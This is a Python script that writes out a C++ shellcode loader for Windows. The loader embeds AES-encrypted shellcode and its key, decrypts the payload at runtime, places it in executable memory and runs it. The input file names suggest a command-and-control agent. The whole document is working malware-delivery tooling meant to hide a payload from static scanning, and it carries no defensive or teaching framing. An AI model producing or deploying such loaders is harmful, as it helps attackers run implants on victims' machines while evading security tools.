def generate_loader_cpp(encrypted_shellcode_path, key_path, output_cpp_path):
    with open(encrypted_shellcode_path, "rb") as f:
        shellcode_bytes = f.read()
    with open(key_path, "rb") as f:
        aes_key = f.read()

    shellcode_array = ",".join(f"0x{b:02X}" for b in shellcode_bytes)
    key_array = ",".join(f"0x{b:02X}" for b in aes_key)

    template = f"""
#include <windows.h>
#include <wincrypt.h>

unsigned char encrypted_shellcode[] = {{
    {shellcode_array}
}};

unsigned char aes_key[] = {{
    {key_array}
}};

void aes_decrypt(unsigned char* data, size_t size, unsigned char* key) {{
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, key, 16, 0);
    CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey);
    DWORD dataLen = size;
    CryptDecrypt(hKey, 0, TRUE, 0, data, &dataLen);
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}}

int main() {{
    aes_decrypt(encrypted_shellcode, sizeof(encrypted_shellcode), aes_key);

    void* exec = VirtualAlloc(0, sizeof(encrypted_shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, encrypted_shellcode, sizeof(encrypted_shellcode));
    ((void(*)())exec)();

    return 0;
}}
"""
    with open(output_cpp_path, "w") as f:
        f.write(template)

    print(f"[+] Generated loader → {output_cpp_path}")

if __name__ == "__main__":
    encrypted_shellcode_path = "sample/agent.x64.aes"
    key_path = "sample/aes_key.bin"
    output_cpp_path = "output/agent_loader.cpp"

    print("[*] Generating loader C++ file...")
    generate_loader_cpp(encrypted_shellcode_path, key_path, output_cpp_path)
    print(f"[+] Loader saved → {output_cpp_path}")